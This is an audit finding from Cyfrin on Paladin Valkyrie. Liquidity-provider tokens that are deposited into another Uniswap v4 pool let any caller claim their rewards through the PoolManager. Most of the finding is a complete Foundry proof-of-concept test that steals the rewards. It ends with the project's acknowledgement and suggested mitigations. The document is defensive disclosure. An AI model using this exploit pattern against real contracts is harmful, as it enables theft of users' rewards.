---
tags:
  - lang/solidity
  - sector/dex
  - sector/farm
  - sector/lending
  - sector/token
  - platform/cyfrin
  - has/github
  - severity/high
protocol: "[[Paladin Valkyrie]]"
auditors:
  - Draiakoo
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md"
genome:
  - "[[reentrancy-guard]]"
  - "[[reward-theft]]"
  - "[[specific-token-type]]"
---
# Rewards can be stolen when `IncentivizedERC20` tokens are recursively provided as liquidity

- id: 61562
- impact: HIGH
- protocol: Paladin Valkyrie
- reporter: Draiakoo (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md

## Summary


Summary: This bug report discusses an issue where rewards can be stolen from incentivized liquidity tokens that are provided to another pool. This can happen even if the person claiming the rewards is not the original depositor. The report suggests creating a wrapped version of these tokens or clearly communicating the risk to users and reward depositors as potential solutions. The issue is already known and steps are being taken to address it, such as advising users to deposit in other pools or using a smart contract that can claim and redirect rewards. The report has been acknowledged by the team.

## Details

**Description:** By virtue of the composable nature of DeFi, it is common to have wrapped liquidity tokens that encapsulate some form of yield or other tokenized incentives in a manner similar to Valkyrie. With the ubiquity of LRTs and other forms of re-hypothecation, such as that enabled by Bunni, this incentivized liquidity is often recursively provided as liquidity when paired with another token.

In this case, an incentivised liquidity token provided to another pool can have its rewards drained by any address, even if they aren’t the original depositor. When added as liquidity to another pool, the `PoolManager` pulls funds from the caller when settling their deltas:

```solidity
function settle(Currency currency, IPoolManager manager, address payer, uint256 amount, bool burn) internal {
    ...
    } else {
        manager.sync(currency);
        if (payer != address(this)) {
            IERC20Minimal(Currency.unwrap(currency)).transferFrom(payer, address(manager), amount);
        } else {
            IERC20Minimal(Currency.unwrap(currency)).transfer(address(manager), amount);
        }
        manager.settle();
    }
}
```

This in turn causes the `notifyTransfer()` hook to be invoked:

```solidity
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    ITokenizedHook(hook).notifyTransfer(poolId, from, to, amount);

    return super.transferFrom(from, to, amount);
}
```

which debits the sender and credits the `PoolManager`:

```solidity
poolUserLiquidity[_id][from] -= amount;
poolUserLiquidity[_id][to] += amount;
```

The attack is subsequently achieved by claiming incentives on behalf of the Uniswap v4 `PoolManager`. This creates a positive delta for the reward token which can be taken to return the transient reserves to zero and settle the delta before the unlock callback ends execution.

**Impact:** Rewards can be stolen when `IncentivizedERC20` tokens are recursively provided as liquidity.

**Proof of Concept:** A new file named `E2E.t.sol` should be created with the following contents:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { Test } from "forge-std/Test.sol";
import { BasicIncentiveLogic } from "../src/incentives/BasicIncentiveLogic.sol";
import { Deployers } from "@uniswap/v4-core/test/utils/Deployers.sol";
import { MockERC20 } from "solmate/src/test/utils/mocks/MockERC20.sol";
import { CurrencyLibrary, Currency } from "@uniswap/v4-core/src/types/Currency.sol";
import { CurrencySettler } from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
import { PoolId, PoolIdLibrary } from "@uniswap/v4-core/src/types/PoolId.sol";
import {
    IncentivizedPoolId, IncentivizedPoolKey, IncentivizedPoolIdLibrary
} from "../src/types/IncentivizedPoolKey.sol";
import { IncentivizedERC20 } from "../src/libraries/IncentivizedERC20.sol";
import { IPoolManager } from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import { PoolKey } from "@uniswap/v4-core/src/types/PoolKey.sol";
import { Hooks } from "@uniswap/v4-core/src/libraries/Hooks.sol";
import { IHooks } from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import { FullRangeHook } from "../src/hooks/FullRangeHook.sol";
import { FullRangeHookImpl } from "./implementations/FullRangeHookImpl.sol";
import { IIncentiveManager } from "../src/interfaces/IIncentiveManager.sol";
import { IncentiveManager } from "../src/incentives/IncentiveManager.sol";
import { TickMath } from "@uniswap/v4-core/src/libraries/TickMath.sol";
import { LiquidityAmounts } from "../src/libraries/LiquidityAmounts.sol";
import { StateLibrary } from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";

import "forge-std/console.sol";

contract E2E is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using IncentivizedPoolIdLibrary for IncentivizedPoolKey;
    using CurrencyLibrary for Currency;
    using CurrencySettler for Currency;
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;

    uint256 constant MAX_DEADLINE = 12329839823;
    /// @dev Min tick for full range with tick spacing of 60
    int24 internal constant MIN_TICK = -887220;
    /// @dev Max tick for full range with tick spacing of 60
    int24 internal constant MAX_TICK = -MIN_TICK;
    int24 constant TICK_SPACING = 60;
    uint16 constant LOCKED_LIQUIDITY = 1000;
    uint256 constant BASE_FEE = 500;
    uint256 constant FEE_DELTA = 0.1 ether;

    event NewIncentiveLogic(uint256 indexed index, address indexed logic);
    event Deposited(address indexed account, PoolId indexed poolId, uint256 liquidity);

    FullRangeHookImpl fullRange = FullRangeHookImpl(
        address(
            uint160(
                Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_SWAP_FLAG
                    | Hooks.AFTER_SWAP_FLAG
            )
        )
    );
    address hookAddress;

    IncentiveManager incentiveManager;

    MockERC20 token0;
    MockERC20 token1;

    PoolId id;

    BasicIncentiveLogic logic;

    address alice;
    address bob;

    struct CallbackData {
        IncentivizedPoolId id;
        Currency currency;
        address recipient;
    }

    function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
        require(msg.sender == address(manager), "caller not manager");

        CallbackData memory data = abi.decode(rawData, (CallbackData));

        address rewardTokenAddress = Currency.unwrap(data.currency);
        MockERC20 rewardToken = MockERC20(rewardTokenAddress);

        manager.sync(data.currency);

        logic.claim(data.id, rewardTokenAddress, address(manager), address(manager));
        uint256 fees = logic.accumulatedFees(rewardTokenAddress);
        assertApproxEqAbs(rewardToken.balanceOf(address(manager)), 100 ether - fees, FEE_DELTA);
        assertApproxEqAbs(rewardToken.balanceOf(address(logic)), fees, FEE_DELTA);

        manager.settleFor(data.recipient);
        data.currency.take(manager, data.recipient, rewardToken.balanceOf(address(manager)), false);

        return abi.encode(0);
    }

    function _fetchBalances(Currency currency, address user, address deltaHolder)
        internal
        view
        returns (uint256 userBalance, uint256 poolBalance, int256 delta)
    {
        userBalance = currency.balanceOf(user);
        poolBalance = currency.balanceOf(address(manager));
        delta = manager.currencyDelta(deltaHolder, currency);
    }

    function createPoolKey(address tokenA, address tokenB, uint24 fee, address _hookAddress)
        internal
        view
        returns (PoolKey memory)
    {
        if (tokenA > tokenB) (tokenA, tokenB) = (tokenB, tokenA);
        return PoolKey(Currency.wrap(tokenA), Currency.wrap(tokenB), fee, int24(60), IHooks(_hookAddress));
    }

    function setUp() public {
        deployFreshManagerAndRouters();
        MockERC20[] memory tokens = deployTokens(2, 2 ** 128);
        token0 = tokens[0];
        token1 = tokens[1];

        incentiveManager = new IncentiveManager();

        FullRangeHookImpl impl = new FullRangeHookImpl(manager, IIncentiveManager(address(incentiveManager)), fullRange);
        vm.etch(address(fullRange), address(impl).code);
        hookAddress = address(fullRange);

        key = createPoolKey(address(token0), address(token1), 3000, hookAddress);
        id = key.toId();

        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);

        vm.label(Currency.unwrap(key.currency0), "currency0");
        vm.label(Currency.unwrap(key.currency1), "currency1");
        vm.label(hookAddress, "fullRangeHook");
        vm.label(address(this), "test contract");
        vm.label(address(manager), "pool manager");
        vm.label(address(incentiveManager), "incentiveManager");

        incentiveManager.addHook(hookAddress);
        initPool(key.currency0, key.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);

        alice = makeAddr("alice");
        bob = makeAddr("bob");

        token0.mint(alice, 100 ether);
        token1.mint(alice, 100 ether);
        vm.startPrank(alice);
        token0.approve(address(fullRange), type(uint256).max);
        token1.approve(address(fullRange), type(uint256).max);
        vm.stopPrank();
    }

    function test_addLiquidityRecursivePoC() public {
        uint256 prevBalance0 = key.currency0.balanceOf(alice);
        uint256 prevBalance1 = key.currency1.balanceOf(alice);

        (uint160 sqrtPriceX96,,,) = manager.getSlot0(key.toId());
        uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96,
            TickMath.getSqrtPriceAtTick(MIN_TICK),
            TickMath.getSqrtPriceAtTick(MAX_TICK),
            10 ether,
            10 ether
        );

        FullRangeHook.AddLiquidityParams memory addLiquidityParams = FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 10 ether, 10 ether, 9 ether, 9 ether, alice, MAX_DEADLINE
        );

        console.log("alice adding liquidity");

        vm.expectEmit(true, true, true, true);
        emit Deposited(alice, id, 10 ether - LOCKED_LIQUIDITY);

        vm.prank(alice);
        fullRange.addLiquidity(addLiquidityParams);

        (bool hasAccruedFees, address liquidityToken) = fullRange.poolInfo(id);
        vm.label(liquidityToken, "LP token 1");
        uint256 liquidityTokenBal = IncentivizedERC20(liquidityToken).balanceOf(alice);

        assertEq(manager.getLiquidity(id), liquidityTokenBal + LOCKED_LIQUIDITY);

        assertEq(key.currency0.balanceOf(alice), prevBalance0 - 10 ether);
        assertEq(key.currency1.balanceOf(alice), prevBalance1 - 10 ether);

        assertEq(liquidityTokenBal, 10 ether - LOCKED_LIQUIDITY);
        assertEq(hasAccruedFees, false);

        // -----
---

        console.log("\n");
        console.log("setting up recursive pool");

        vm.prank(alice);
        MockERC20(liquidityToken).approve(hookAddress, type(uint256).max);

        address token0 = Currency.unwrap(key.currency0);
        address token1 = liquidityToken;

        vm.label(token0, "recursive token 0");
        vm.label(token1, "recursive token 1 (LP token 1)");

        if (token0 > token1) {
            (token0, token1) = (token1, token0);
            vm.label(token0, "recursive token0 (LP token 1)");
            vm.label(token1, "recursive token1");
        }

        PoolKey memory recursiveKey = PoolKey(Currency.wrap(token0), Currency.wrap(token1), 3000, 60, IHooks(hookAddress));
        PoolId recursiveId = recursiveKey.toId();
        initPool(recursiveKey.currency0, recursiveKey.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);
        (, address recursiveLiquidityToken) = fullRange.poolInfo(recursiveId);
        vm.label(recursiveLiquidityToken, "LP token 2");

        // -----
---

        console.log("\n");
        console.log("bob deposits incentives for original pool");

        logic = new BasicIncentiveLogic(address(incentiveManager), BASE_FEE);

        vm.expectEmit(true, true, true, true);
        emit NewIncentiveLogic(1, address(logic));
        incentiveManager.addIncentiveLogic(address(logic));

        IncentivizedPoolId expectedId = IncentivizedPoolKey({ id: id, lpToken: liquidityToken }).toId();

        assertEq(incentiveManager.incentiveSystemIndex(address(logic)), 1);
        assertEq(incentiveManager.poolListedIncentiveSystems(expectedId, 1), false);

        MockERC20 rewardToken = new MockERC20("Reward Token", "RT", 18);
        vm.label(address(rewardToken), "reward token");

        rewardToken.mint(bob, 100 ether);
        vm.prank(bob);
        rewardToken.approve(address(logic), type(uint256).max);

        (address system, bool updateOnSwap) = incentiveManager.incentiveSystems(1);
        assertEq(system, address(logic));
        assertEq(updateOnSwap, false);

        vm.prank(bob);
        logic.depositRewards(expectedId, address(rewardToken), 100 ether, 2 weeks);
        assertEq(rewardToken.balanceOf(address(this)), 0);
        assertEq(rewardToken.balanceOf(address(logic)), 100 ether);
        assertEq(incentiveManager.poolListedIncentiveSystems(expectedId, 1), true);

        // -----
---

        console.log("\n");
        console.log("alice adding recursive liquidity");

        uint256 prevBalance0Recursive = recursiveKey.currency0.balanceOf(alice);
        uint256 prevBalance1Recursive = recursiveKey.currency1.balanceOf(alice);

        (uint160 sqrtPriceX96Recursive,,,) = manager.getSlot0(recursiveId);
        uint128 liquidityRecursive = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96Recursive,
            TickMath.getSqrtPriceAtTick(MIN_TICK),
            TickMath.getSqrtPriceAtTick(MAX_TICK),
            liquidityTokenBal,
            liquidityTokenBal
        );

        FullRangeHook.AddLiquidityParams memory addLiquidityParamsRecursive = FullRangeHook.AddLiquidityParams(
            recursiveKey.currency0, recursiveKey.currency1, 3000, liquidityTokenBal, liquidityTokenBal, liquidityTokenBal * 9/10, liquidityTokenBal * 9/10, alice, MAX_DEADLINE
        );

        vm.expectEmit(true, true, true, true);
        emit Deposited(alice, recursiveId, liquidityTokenBal - LOCKED_LIQUIDITY);

        vm.prank(alice);
        fullRange.addLiquidity(addLiquidityParamsRecursive);

        (bool hasAccruedFeesRecursive,) = fullRange.poolInfo(recursiveId);
        uint256 liquidityTokenBalRecursive = IncentivizedERC20(recursiveLiquidityToken).balanceOf(alice);

        assertEq(manager.getLiquidity(recursiveId), liquidityTokenBalRecursive + LOCKED_LIQUIDITY);

        assertEq(recursiveKey.currency0.balanceOf(alice), prevBalance0Recursive - liquidityTokenBal);
        assertEq(recursiveKey.currency1.balanceOf(alice), prevBalance1Recursive - liquidityTokenBal);

        assertEq(liquidityTokenBalRecursive, liquidityTokenBal - LOCKED_LIQUIDITY);
        assertEq(hasAccruedFeesRecursive, false);

        // -----
---

        console.log("\n");
        console.log("maliciously claiming alice's rewards");

        skip(3 weeks);

        manager.unlock(abi.encode(CallbackData(expectedId, Currency.wrap(address(rewardToken)), address(this))));
        assertApproxEqAbs(rewardToken.balanceOf(address(this)), 100 ether - logic.accumulatedFees(address(rewardToken)), FEE_DELTA);
    }
}
```

Note that it is not possible to steal rewards with flash accounting using alternative callback shown below due to the user state updates that are performed on notification of the transfer. By extension, this also means that honest users will lose their rewards that were accruing for the duration of the deposit when removing liquidity from the pool:

```solidity
function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
    require(msg.sender == address(manager), "caller not manager");

    CallbackData memory data = abi.decode(rawData, (CallbackData));

    address rewardTokenAddress = Currency.unwrap(data.currency);
    MockERC20 rewardToken = MockERC20(rewardTokenAddress);
    (, address liquidityTokenAddress) = fullRange.poolInfo(id);
    IncentivizedERC20 liquidityToken = IncentivizedERC20(liquidityTokenAddress);
    Currency liquidityTokenCurrency = Currency.wrap(liquidityTokenAddress);

    console.log("manager earned: %s", logic.earned(data.id, rewardTokenAddress, address(manager)));

    // flash liquidity token
    liquidityTokenCurrency.take(manager, data.recipient, liquidityToken.balanceOf(address(manager)), false);

    console.log("recipient balance: %s", liquidityToken.balanceOf(data.recipient));
    console.log("recipient earned: %s", logic.earned(data.id, rewardTokenAddress, data.recipient));

    // attempt to claim rewards
    logic.claim(data.id, rewardTokenAddress, data.recipient, data.recipient);
    uint256 fees = logic.accumulatedFees(rewardTokenAddress);

    // these assertions fail as no rewards are claimed
    // assertApproxEqAbs(rewardToken.balanceOf(data.recipient), 100 ether - fees, FEE_DELTA);
    // assertApproxEqAbs(rewardToken.balanceOf(address(logic)), fees, FEE_DELTA);

    // settle liquidity token
    liquidityTokenCurrency.settle(manager, data.recipient, liquidityToken.balanceOf(data.recipient), false);

    return abi.encode(0);
}
```

**Recommended Mitigation:** Explicitly handling the case where `IncentivizedERC20` tokens are sent to the `PoolManager` is not sufficient as these pools could still be created on other venues such as Uniswap v2 or v3. Restricting claims to be made by only the address holding the funds does not mitigate against claims made during flash swaps and has other downsides still.

A wrapped version of `IncentivizedERC20` tokens is likely the safest way to enable the creation of recursive liquidity pools, although this comes with added complexity. Alternatively, it is recommended to clearly communicate this risk to liquidity providers and reward depositors.

**Paladin:** This issue was known, and is common to any type of reward accruing ERC20s. It is already planned to communicate to users and incentives depositors about this scenario, and to advise anybody that would like to use such LP tokens to deposit in another Uniswap Pool (V2, V3 or V4) or even in any other DeFi protocol to either make sure the smart contract that will receive the ERC20s will be able to claim and redirect the rewards, or to use a wrapped version of the ERC20 that will have such logic.

**Cyfrin:** Acknowledged.
